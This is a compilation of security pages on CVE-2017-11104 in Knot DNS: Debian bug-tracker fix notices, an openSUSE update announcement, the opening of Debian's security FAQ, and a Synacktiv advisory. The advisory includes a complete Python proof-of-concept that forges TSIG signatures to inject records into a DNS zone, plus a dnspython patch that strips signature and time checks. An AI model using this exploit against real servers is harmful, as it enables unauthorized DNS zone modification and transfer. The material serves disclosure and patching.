 e5c84db19c7afd7e50976aad47ddce74c82b9ad906841845f3fbf6b31c727157 203532 knot_1.6.0-1+deb8u1_amd64.deb
 0af985056c7b098fe1da0cc31a4af440b5c50081043714d8845a6e638961e8c7 168174 knot-libs_1.6.0-1+deb8u1_amd64.deb
 a1f813a61d568043607bd0c3e794632531ab429e53ada987c9a35765ffd9a6da 1773014 knot-dbg_1.6.0-1+deb8u1_amd64.deb
 972128fcc7c15bd89df7ee9b7f44a9a7d4299281a0dfafbeebb5ad869fb26d27 66904 knot-dnsutils_1.6.0-1+deb8u1_amd64.deb
 28c8f87375d5d12d27e5084597e4d1db4b81e5c8f199795ff4e52a6f62648a46 49744 knot-host_1.6.0-1+deb8u1_amd64.deb
 6213e9d5304ee8b9a1587c7477c9a2033c8b8e122d04f2ffad0559a8213e07f3 448320 knot-doc_1.6.0-1+deb8u1_all.deb
Files:
 3098ea100fa17048bb377ccf3c13fbb0 2018 net optional knot_1.6.0-1+deb8u1.dsc
 63cd27658e05a7cd4f950b7e0b5c723a 781192 net optional knot_1.6.0.orig.tar.xz
 b1a186db075c3b261580b64f82025ec6 17744 net optional knot_1.6.0-1+deb8u1.debian.tar.xz
 9de68c366084b6d926204a88d774b3ea 203532 net optional knot_1.6.0-1+deb8u1_amd64.deb
 f024fdcac2df16026e6532c4ed07c2b8 168174 libs optional knot-libs_1.6.0-1+deb8u1_amd64.deb
 d516a656ec9076b369bd13da2e4f3841 1773014 debug extra knot-dbg_1.6.0-1+deb8u1_amd64.deb
 b3723db8a7a03c8657647a57cccb17be 66904 net optional knot-dnsutils_1.6.0-1+deb8u1_amd64.deb
 3a4dd15ee90d4f345fc1e5520ab1b4fe 49744 net optional knot-host_1.6.0-1+deb8u1_amd64.deb
 999da006c2abf553d6659e03a85b0436 448320 doc optional knot-doc_1.6.0-1+deb8u1_all.deb

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEl0WwInMjgf6efq/1bdtT8qZ1wKUFAlloxxAACgkQbdtT8qZ1
wKWYGwf/UK1m4wV16b7/J7gpt7BPRh0TBp6A6r75G/0am5B6j3oQgCe9gOWg3Avl
FKmivd1tF8oZhc2lv6d5HS2nR39RrrTcjiCvd4U4kWKtQE4CB83wi112GKhfRNPC
NnvD+eFml603N15vjsqrDRgpLPAPInsWUJxxPHQP9LxHKOsdAm34q52Q8iFa92PH
Nur5s2LowEElSBBQnTAmMcukwQL5cCXjnB32ddCmxlAHVSzDvHk5Cp7FoccJ3xZu
uKCPdNcYYS4mXiipMOuMFlLBtTpKP7dcenNwtDq/UyX5jxvUfcuxRYI231L57Sn/
0u2TetX6uIcxjJFY+M4thj8Y2t8vTA==
=fcDC
-----END PGP SIGNATURE-----

```

---

**Reply sent**
to `Yves-Alexis Perez <corsac@debian.org>`:

You have taken responsibility.
(Sat, 15 Jul 2017 21:48:20 GMT) ([full text](bugreport.cgi?bug=865678;msg=33), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=33), [link](#32)).

---

**Notification sent**
to `Salvatore Bonaccorso <carnil@debian.org>`:

Bug acknowledged by developer.
(Sat, 15 Jul 2017 21:48:20 GMT) ([full text](bugreport.cgi?bug=865678;msg=35), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=35), [link](#34)).

---

[Message #36](#36) received at 865678-close@bugs.debian.org ([full text](bugreport.cgi?bug=865678;msg=36), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=36), reply):

![](/cgi-bin/libravatar.cgi?email=corsac%40debian.org)
From: Yves-Alexis Perez <corsac@debian.org>
To: 865678-close@bugs.debian.org
Subject: Bug#865678: fixed in knot 2.4.0-3+deb9u1
Date: Sat, 15 Jul 2017 21:47:22 +0000
```
Source: knot
Source-Version: 2.4.0-3+deb9u1

We believe that the bug you reported is fixed in the latest version of
knot, which is due to be installed in the Debian FTP archive.

A summary of the changes between this version and the previous one is
attached.

Thank you for reporting the bug, which will now be closed.  If you
have further comments please address them to 865678@bugs.debian.org,
and the maintainer will reopen the bug report if appropriate.

Debian distribution maintenance software
pp.
Yves-Alexis Perez <corsac@debian.org> (supplier of updated knot package)

(This message was generated automatically at their request; if you
believe that there is a problem with it please contact the archive
administrators by mailing ftpmaster@ftp-master.debian.org)

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA512

Format: 1.8
Date: Thu, 13 Jul 2017 21:56:05 +0200
Source: knot
Binary: knot libknot5 libzscanner1 libdnssec2 libknot-dev knot-dnsutils knot-host knot-doc
Architecture: source
Version: 2.4.0-3+deb9u1
Distribution: stretch-security
Urgency: high
Maintainer: Debian DNS Packaging <pkg-dns-devel@lists.alioth.debian.org>
Changed-By: Yves-Alexis Perez <corsac@debian.org>
Closes: [865678](bugreport.cgi?bug=865678)
Description:
 knot       - Authoritative domain name server
 knot-dnsutils - Clients provided with Knot DNS (kdig, knslookup, knsupdate)
 knot-doc   - Documentation for Knot DNS
 knot-host  - Version of 'host' bundled with Knot DNS
 libdnssec2 - DNSSEC shared library from Knot
 libknot5   - Authoritative domain name server (shared library)
 libknot-dev - Knot DNS shared library development files
 libzscanner1 - DNS zone-parsing library from Knot
Changes:
 knot (2.4.0-3+deb9u1) stretch-security; urgency=high
 .
   * Non-maintainer upload by the Security Team.
   * debian/patches:
     - 0001-tsig-move-signature-validity-period-check-after-the- added, fix
     TSIG signature validation bypass ([CVE-2017-11104](https://security-tracker.debian.org/tracker/CVE-2017-11104))           closes: #[865678](bugreport.cgi?bug=865678)
Checksums-Sha1:
 cd190e31c3b910dd139a8f60d09567a3a47193f5 2349 knot_2.4.0-3+deb9u1.dsc
 c1ad6007f5ecd31940f967e4370255d83869add7 1102856 knot_2.4.0.orig.tar.xz
 d20ac0f28e1a11cf38795b7a8692972a942ca00b 22592 knot_2.4.0-3+deb9u1.debian.tar.xz
Checksums-Sha256:
 72fa5a5ea38bf1131dd57065f9d5b2920104b557693ae0a066042689b421691e 2349 knot_2.4.0-3+deb9u1.dsc
 0ba4d3e6951fc4d5c0e3dc88a720462690dd1d25f4bc1e7c24bb5747d3853679 1102856 knot_2.4.0.orig.tar.xz
 8f023a2a91f838af742851d420ed7f5a0049e1dea2b9129b58e7ace7fc5ddfdb 22592 knot_2.4.0-3+deb9u1.debian.tar.xz
Files:
 b58e4de0ccf430a0b878785ecd4db18a 2349 net optional knot_2.4.0-3+deb9u1.dsc
 549dcc3778f12adee8d624dbc2c4de20 1102856 net optional knot_2.4.0.orig.tar.xz
 aa92495bdb4dbbd687e765d130cdec2a 22592 net optional knot_2.4.0-3+deb9u1.debian.tar.xz

-----BEGIN PGP SIGNATURE-----

iQEzBAEBCgAdFiEEl0WwInMjgf6efq/1bdtT8qZ1wKUFAllotKkACgkQbdtT8qZ1
wKXzawf+NMh1E4IQTU0bIOlQARSzmIlT9TYWwz6Ifentl5Rrr74k9Wmr7Us8eXmM
6O5/VAJSoVW3iLC089pFnMKKNA/WR2v4ESK9BT/V4jc4I8vJd1yyzpRr9FpcV9+B
dpx7wtg70SxYpUlZnZMDWqs+bgXxk3pgbliMVMgfOvaZF3Ngb+jHuD9OncJqCQrE
4afPjbhas8ZFzdD/pB4opwF2ePqhjKNRHBcUsoNr3hnh4Ek4zPw+1DQ4AAZFKRAI
xwWz4f9k+XZZselDL8/FOB+ymAY3R8kLQX4IODt1SYAuBCLD8V1iAoSe/qr6myCi
p88GgXgmT6diWdmV46uTX0QoXilefg==
=s4Em
-----END PGP SIGNATURE-----

```

---

**Marked as fixed in versions knot/2.5.3-1.**
Request was from `Ondřej Surý <ondrej@debian.org>`
to `control@bugs.debian.org`.
(Fri, 21 Jul 2017 09:51:14 GMT) ([full text](bugreport.cgi?bug=865678;msg=38), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=38), [link](#37)).

---

**Marked as found in versions knot/1.6.0-1.**
Request was from `Salvatore Bonaccorso <carnil@debian.org>`
to `control@bugs.debian.org`.
(Fri, 21 Jul 2017 10:57:07 GMT) ([full text](bugreport.cgi?bug=865678;msg=40), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=40), [link](#39)).

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Tue, 22 Aug 2017 07:32:23 GMT) ([full text](bugreport.cgi?bug=865678;msg=42), [mbox](bugreport.cgi?bug=865678;mbox=yes;msg=42), [link](#41)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=865678).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 05:53:02 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from www.synacktiv.ninja_e8b5988c_20250125_055300.html ===
TSIG authentication bypass through
signature forgery in Knot DNS

Security advisory
06/23/17

Clément BERTHAUX

www.synacktiv.com

5 rue Sextius Michel 75015 Paris

1. Vulnerability description

1.1. About Knot DNS

Knot DNS is a high­performance authoritative­only DNS server which supports all key features of the
modern domain name system.

1.2. About TSIG

TSIG is an authentication protocol for DNS defined in RFC 2845 in 2000. The idea is to provide a
transaction level authentication based on a message signature using a HMAC operation with a shared
secret. It is primarily used to authenticate dynamic DNS update requests as well as zone transfer
operations.

This protocol is widely used and supported by a vast majority of DNS server software such as BIND,
PowerDNS, NSD and, of course, Knot DNS.

1.3. The issue

Synacktiv experts discovered a flaw within the TSIG protocol implementation in Knot DNS that would allow
an attacker with a valid key name to bypass the TSIG authentication on zone updates, notify and transfers
operations.

This issue is due to the fact that when the server receives a request which TSIG timestamp is out of the
time window, it still signs its answer, using the provided digest as prefix even though this digest is invalid
and has an incorrect size. This allow an attacker to forge the signature of a valid request, hence bypassing
the TSIG authentication.

1.4. Affected versions

The issue was tested and proven to affect the following Knot DNS versions:

•
•
•

Knot DNS 2.4.1
Knot DNS 2.4.4
Knot DNS 2.5.1

The vulnerability was patched in  Knot DNS 2.5.2 and Knot DNS 2.4.5: https://www.knot­dns.cz/2017­06­
23­version­252­and­245.html

1.5. Mitigation

Upgrade to Knot DNS 2.5.2 or Knot DNS 2.4.5.

It is also possible to mitigate this vulnerability by setting ACLs on IP addresses for TSIG protected
operations and by using hard to guess TSIG key names but keep in mind that this mitigation doesn’t
provide any protection against a MITM adversary.

 2/17

1.6. Timeline

Date

06/19/17

06/23/17

Advisory sent to the Knot DNS security team

Knot DNS fixed the vulnerability in Knot DNS 2.5.2 and Knot DNS 2.4.5.

Action

 3/17

2. Technical description and proof-of-concept

2.1. Attack scenario

This vulnerability can be exploited by an attacker to update a DNS zone or dump its content provided that:

The attacker can guess a valid TSIG key name and the associated algorithm

•
• No additional network ACL is configured regarding the desired operation

As such, configurations like the following one are affected:

key:
  - id: tsig_key
    algorithm: hmac-sha256
    secret: YmxhYmxhbXlzZWNyZXRrZXk=

acl:
  - id: key_rule
    key: tsig_key
    action: [transfer,notify, update]

zone:
  - domain: example.com
    storage: /var/lib/knot/zones/
    file: example.com.zone
    acl: key_rule

[...]

2.2. Vulnerability discovery

According to the RFC 2845 on TSIG section 4.2, DNS servers answers to TSIG­signed requests have to
be signed and the digest components need to be the following:

• Request MAC size on 2 bytes
• Request MAC
• DNS Message (response)
•
TSIG Variables (response)

Note that RFC 2845 is, by itself, not conform to cryptography best practices in particular to the rule “one
key per use”. The client and the server should use different keys, for example by using a derivation
function like TLS does.

When processing a TSIG­signed query with a timestamp that doesn’t belong to the valid time window
(server time +/­ fudge value), Knot DNS returns a BADTIME TSIG error. This answer is signed.

 4/17

However, in this case, the digest size and the digest itself are never checked before being reused to
compute the answer digest.

This can be confirmed dynamically with a Python script using a patched version of dnspython (the patch
can be found in appendix):

import dns.query

import dns.tsigkeyring

import dns.tsig

import dns.message

keyring = dns.tsigkeyring.from_text({
    'tsig_key' : 'whatever_wrong_key'.encode('base64')

})

r = dns.message.make_query('example.com.', dns.rdatatype.AXFR)

r.use_tsig(keyring, keyname='tsig_key', algorithm=dns.tsig.HMAC_SHA256)

# wrong timestamp

r.time_func = lambda: 0xdeadbeef

# larger digest

r.request_hmac = 'A'*0x100

 5/17

dns.query.tcp(r, '172.17.0.27')

Upon execution of this script, with a hook on dnssec_tsig_add  from src/dnssec/lib/tsig.c, to dump the data
used to compute the answer digest, the following log entry is recorded:

* dnssec_tsig_add called, data is:
           0  1  2  3  4  5  6  7  8  9  A  B  C  D  E  F  0123456789ABCDEF

00000000  01 00 41 41 41 41 41 41 41 41 41 41 41 41 41 41  ..AAAAAAAAAAAAAA

00000010  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000020  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000030  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000040  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000050  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000060  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000070  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000080  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000090  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

000000a0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

000000b0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

000000c0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

000000d0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

000000e0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

000000f0  41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA

00000100  41 41 ce ef 81 09 00 01 00 00 00 00 00 00 07 65  AA.............e

00000110  78 61 6d 70 6c 65 03 63 6f 6d 00 00 fc 00 01 08  xample.com......

00000120  74 73 69 67 5f 6b 65 79 00 00 ff 00 00 00 00 0b  tsig_key........

00000130  68 6d 61 63 2d 73 68 61 32 35 36 00 00 00 de ad  hmac-sha256.....

00000140  be ef 01 2c 00 12 00 06 00 00 59 2d 8d f0        ...,......Y-..

At this point, it is possible to generate a valid digest for a message with an arbitrary prefix, provided that the
TSIG key name and algorithm are known.

The idea is then to use this to forge the digest of a valid request and replay it with the returned digest.

 6/17

2.3. Exploitation

To exploit this vulnerability, one first needs to generate a trigger request. This request will be signed using
TSIG and have a corrupted digest as well as a timestamp ahead­of­time. This can be done using the
Python package dnspython with a patch to be able to alter the digest (the patch can be found in appendix):

# create the trigger request

trigger = dns.update.Update(zone)

# enable tsig with a valid keyname

trigger.use_tsig(keyring, keyname=keyname, algorithm=dns.tsig.HMAC_SHA256)

# alter the digest

trigger.request_hmac = '\x00'*0x40

ts = time()

# alter the timestamp to trigger the BADTIME TSIG error (fudge = 300 by default)

trigger.time_func = lambda: ts+301

dns.query.udp(trigger, '172.17.0.30')

 7/17

When such a request is sent, the generated packet looks like the following:

The answer returned by Knot DNS looks like the following:

 8/17

According to the RFC 2845, the components used to compute the answer TSIG digest are the following:

•

the request digest, prefixed by its size as a 16 bit unsigned integer:

00000000  00 40 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |.@..............|

00000010  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

00000020  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

00000030  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|

00000040  00 00                                             |..|

•

the answer data without the TSIG record

00000000  5b b8 a8 01 00 01 00 00  00 00 00 01 07 65 78 61  |[............exa|

00000010  6d 70 6c 65 03 63 6f 6d  00 00 06 00 01           |mple.com.....|

•

the TSIG record without its digest and digest size attributes (but with the error and other data
attributes)

00000000  08 74 73 69 67 5f 6b 65  79 00 00 fa 00 ff 00 00  |.tsig_key.......|

00000010  00 00 00 43 0b 68 6d 61  63 2d 73 68 61 32 35 36  |...C.hmac-sha256|

00000020  00 00 00 59 41 30 1a 01  2c 5b b8 00 12 00 06 00  |...YA0..,[......|

00000030  00 59 41 2e ed 0a                                 |.YA...|

Let’s take the example of a DNS update TSIG bypass, we need to forge a valid update with a padding
record to “absorb” the answer data mentioned above (which is part of the digest components which means
the signature won’t match if we don’t include it).

This can be done with dnspython using the following snippet:

def get_update(zone, size_to_absorb):
    req = dns.update.Update(zone, size_to_absorb)
    req.add('i.can.inject.records.in.the.zone', 3600, 'txt', 'injected')

 9/17

    req.delete('padding', 'txt')
    req.add('padding', 3600, 'txt', 'A'*size_to_absorb)
    return req

In our trigger request, we replace the digest with the data that represents the freshly forged request,
stripping the padding record content to absorb the size_to_replace bytes that will be appended during the
answer signature. This size only depends on the zone name and can be computed as follow:

# size of the answer data to absorb

sz = 12+sum(len(e)+1 for e in (zone).split('.'))+1+4

# create the forged request

forged = get_update(zone, sz, ts)

# get forged data and strip the transaction ID and the last sz bytes of padding data

forged_data = forged.to_wire()

forged_data = forged_data[2:-sz]

# set trigger hmac to forged request

trigger.request_hmac = forged_data

trigger.time_func = lambda: ts

print '[+] sending trigger request'

# udp works too

ans = dns.query.tcp(trigger, host)

The server answers the trigger request with a BADTIME TSIG error and signs it. In our forged packet, we
replace the padding record data with the size_to_replace first bytes of the answer. It is also needed to
patch the byte that represents the answer Additional RRs count field as well as setting the TSIG error code
and other data fields which are used in the digest:

print '[+] signed request mac is %s' % ans.mac.encode('hex')

# patch id

forged.id = len(forged_data)

forged.use_tsig(keyring, keyname=keyname, original_id=len(forged_data),

algorithm=dns.tsig.HMAC_SHA256)

# set TSIG error because it's part of the digest

forged.tsig_error = 0x12

forged.other_data = '\x00\x00'+pack('>I', int(t))

 10/17

# keep same ts

forged.time_func = lambda: ts

# replace hmac

forged.request_hmac = ans.mac

# patch additionnal_record_count in pad data -> 0

data = ans.to_wire()[:11]+'\x00'+ans.to_wire()[12:sz]

forged.authority[-1][0].strings[0] = data

p = dns.query.tcp(forged, host)

We finally replace the forged request digest with that of the answer, wait for the timestamp to be valid and
send the update request.

In the Knot DNS logs, the zone is correctly updated:

2017-06-14T12:20:52 info: [example.com.] DDNS, processing 1 updates

2017-06-14T12:20:52 info: [example.com.] DDNS, update finished, serial 2017053021 ->

2017053022, 76.11 seconds

2017-06-14T12:20:52 info: [example.com.] zone file updated, serial 2017053021 ->

2017053022

 11/17

2.4. Proof-of-Concept Exploit

The POC exploit code to bypass TSIG and perform a zone update is the following. It should be noted that it
is also possible to perform zone transfer and notify operations.

As stated above, it needs a patched version of dnspython which can be found in appendix:

import dns.query

import dns.zone

import dns.tsigkeyring

import dns.tsig

import dns.message

import dns.update

from time import time, sleep

from struct import pack

def get_forged(zone, sz):
    req = dns.update.Update(zone)
    req.add('i.can.inject.records.in.the.zone', 3600, 'txt', 'injected')
    req.delete('padding', 'txt')
    req.add('padding', 3600, 'txt', '\x00'*sz)
    return req

def exploit(host, zone, key_name):
    keyring = dns.tsigkeyring.from_text({
        key_name : 'whateverwrongkey'.encode('base64')
    })
    origin = dns.name.from_text(zone)

    sz = 12+sum(len(e)+1 for e in (zone).split('.'))+1+4
    fudge = 300

    forged = get_forged(zone, sz)

    # get forged data and strip the last sz bytes of padding data
    forged_data = forged.to_wire()
    forged_data = forged_data[2:-sz]

    forged.id = len(forged_data)

    print '[+] generated forged request'

 12/17

    # For some reasons triggering a TSIG BADTIME error doesn't seem to be logged by Knot
    trigger = dns.message.make_query(zone, dns.rdatatype.A)

    trigger.use_tsig(keyring, keyname=key_name, algorithm=dns.tsig.HMAC_SHA256)

    t = time()
    ts = time()+fudge+1

    # set timestamp out of valid time window
    trigger.time_func = lambda:ts

    # alter trigger digest
    trigger.request_hmac = forged_data

    print '[+] sending trigger with forged digest'

    ans = dns.query.tcp(trigger, host, origin=origin)

    if not ans.mac:
        print '[-] couldnt get mac from answer, probably got TSIG_BAD_KEY but dnspython

is too bad to populate the tsig_error attribute'
        return

    # add TSIG record
    forged.use_tsig(keyring, keyname=key_name, original_id=forged.id,

algorithm=dns.tsig.HMAC_SHA256)

    # use the same ts which should now be valid
    forged.time_func = lambda: ts

    # replace digest
    forged.request_hmac = ans.mac

    # set TSIG error because it's part of the digest
    forged.tsig_error = 0x12
    forged.other_data = '\x00\x00'+pack('>I', int(t))

    print '[+] signed request mac is %s' % ans.mac.encode('hex')

    forged.id = len(trigger.request_hmac)

    print '[+] waiting for signature validity'

 13/17

    sleep(2)

    # patch additionnal_record_count in padding data
    data = ans.to_wire()[:11]+'\x00'+ans.to_wire()[12:sz]

    forged.authority[-1][0].strings[0] = data

    print '[+] sending forged update'
    p = dns.query.udp(forged, host)
    if p.rcode():
        print '[-] update failed, got errcode %d' % p.rcode()
        return

    print '[+] zone updated !'

if __name__ == '__main__':
    from argparse import ArgumentParser

    p = ArgumentParser()
    p.add_argument('host')
    p.add_argument('zone')
    p.add_argument('keyname')

    o = p.parse_args()

    exploit(o.host, o.zone, o.keyname)

 14/17

Appendix: dnspython patch to alter TSIG
attributes

diff dns/message.py /usr/lib/python2.7/dist-packages/dns/message.py

423c423

<                        self.keyalgorithm, time_func=self.time_func if hasattr(self,

'time_func') else None, request_hmac=self.request_hmac if hasattr(self, 'request_hmac')

else '')

---

>                        self.keyalgorithm)

diff dns/query.py /usr/lib/python2.7/dist-packages/dns/query.py

273c273

<         one_rr_per_rrset=False, origin=None):

---

>         one_rr_per_rrset=False):

299c299

<     wire = q.to_wire(origin=origin)

---

>     wire = q.to_wire()

diff dns/renderer.py /usr/lib/python2.7/dist-packages/dns/renderer.py

26d25

<

32d30

<

255c253

<                  request_mac, algorithm=dns.tsig.default_algorithm, time_func=None,

request_hmac=''):

---

>                  request_mac, algorithm=dns.tsig.default_algorithm):

280d277

<

282,293c279,287

<                                                         keyname,

<                                                         secret,

<                                                         int(time_func() if time_func

else time.time()),

<                                                         fudge,

<                                                         id,

<                                                         tsig_error,

<                                                         other_data,

<                                                         request_mac,

<                                                         algorithm=algorithm,

 15/17

<                                                       hmac_value=request_hmac

<                                                       )

<

---

>                                                     keyname,

>                                                     secret,

>                                                     int(time.time()),

>                                                     fudge,

>                                                     id,

>                                                     tsig_error,

>                                                     other_data,

>                                                     request_mac,

>                                                     algorithm=algorithm)

diff dns/tsig.py /usr/lib/python2.7/dist-packages/dns/tsig.py

73c73

<          algorithm=default_algorithm, hmac_value=''):

---

>          algorithm=default_algorithm):

110,112c110

<

<     mac = ctx.digest() if not hmac_value else hmac_value

<

---

>     mac = ctx.digest()

161,171c159,169

<     # if error != 0:

<     #     if error == BADSIG:

<     #         raise PeerBadSignature

<     #     elif error == BADKEY:

<     #         raise PeerBadKey

<     #     elif error == BADTIME:

<     #         raise PeerBadTime

<     #     elif error == BADTRUNC:

<     #         raise PeerBadTruncation

<     #     else:

<     #         raise PeerError('unknown TSIG error code %d' % error)

---

>     if error != 0:

>         if error == BADSIG:

>             raise PeerBadSignature

>         elif error == BADKEY:

>             raise PeerBadKey

>         elif error == BADTIME:

>             raise PeerBadTime

 16/17

>         elif error == BADTRUNC:

>             raise PeerBadTruncation

>         else:

>             raise PeerError('unknown TSIG error code %d' % error)

174,175c172,173

<     # if now < time_low or now > time_high:

<     #     raise BadTime

---

>     if now < time_low or now > time_high:

>         raise BadTime

179,180c177,178

<     # if (our_mac != mac):

<     #     raise BadSignature

---

>     if (our_mac != mac):

>         raise BadSignature

 17/17



=== Content from lists.opensuse.org_e640da38_20250125_055256.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/#IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV)

# [security-announce] openSUSE-SU-2020:1112-1: moderate: Security update for knot

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

29 Jul
2020

29 Jul
'20

22:18

openSUSE Security Update: Security update for knot
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2020:1112-1
Rating: moderate
References: #1047841
Cross-References: CVE-2017-11104
Affected Products:
openSUSE Backports SLE-15-SP1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
This update for knot fixes the following issues:
- CVE-2017-11104: Fixed an improper implementation of TSIG protocol which
could have allowed an attacker with a valid key name and algorithm to
bypass TSIG authentication (boo#1047841).
This update was imported from the openSUSE:Leap:15.1:Update update project.
Patch Instructions:
To install this openSUSE Security Update use the SUSE recommended installation methods
like YaST online\_update or "zypper patch".
Alternatively you can run the command listed for your product:
- openSUSE Backports SLE-15-SP1:
zypper in -t patch openSUSE-2020-1112=1
Package List:
- openSUSE Backports SLE-15-SP1 (aarch64 ppc64le s390x x86\_64):
knot-1.6.8-bp151.4.3.1
References:
<https://www.suse.com/security/cve/CVE-2017-11104.html>
<https://bugzilla.suse.com/1047841>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV/#IFCSNCQM7VHDF3EAD4FCLJ3JKYJF7QVV)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.



=== Content from www.debian.org_2c992b25_20250126_062842.html ===

[![Debian](../Pics/openlogo-50.png)](../ "Debian Home")

[Skip Quicknav](#content)

* [Blog](https://bits.debian.org/ "Bits from Debian")
* [Micronews](https://micronews.debian.org "Micronews from Debian")
* [Planet](https://planet.debian.org/ "The Planet of Debian")

[Security Information](./)
/
Debian security FAQ

# Debian security FAQ

1. [I received a DSA via debian-security-announce, how can I upgrade the vulnerable packages?](#buthow)- [The signature on your advisories does not verify correctly!](#signature)- [How is security handled in Debian?](#handling)- [Why are you fiddling with an old version of that package?](#oldversion)- [The version number for a package indicates that I am still running a vulnerable version!](#version)- [I received an advisory, but the build for one processor architecture seems to be missing.](#archismissing)- [How is security handled for unstable?](#unstable)- [How is security handled for testing?](#testing)- [How is security handled for contrib, non-free and non-free-firmware?](#contrib)- [The advisory says unstable is fixed in version 1.2.3-1, but unstable has 1.2.5-1, what's up?](#sidversionisold)- [Why are there no official mirrors for security.debian.org?](#mirror)- [I've seen DSA 100 and DSA 102, now where is DSA 101?](#missing)- [How can I reach the security team?](#contact)- [I guess I found a security problem, what should I do?](#discover)- [What am I supposed to do with a security problem in one of my packages?](#care)- [I tried to download a package listed in one of the security advisories, but I got a `file not found' error.](#enofile)- [I've got a bugfix, can I upload to security.debian.org directly?](#upload)- [I've got a bugfix, can I upload to proposed-updates instead?](#ppu)- [I'm pretty sure my packages are fine, how can I upload them?](#SecurityUploadQueue)- [How can I help with security?](#help)- [What is the scope of proposed-updates?](#proposed-updates)- [How is the security team composed?](#composing)- [How long will security updates be provided?](#lifespan)- [How can I check the integrity of packages?](#check)- [What to do if a random package breaks after a security update?](#break)- [What is a CVE identifier?](#cvewhat)- [Does Debian issue a DSA for every CVE id?](#cvedsa)- [Can Debian assign CVE identifiers?](#cveget)- [Does Debian have a vulnerability disclosure 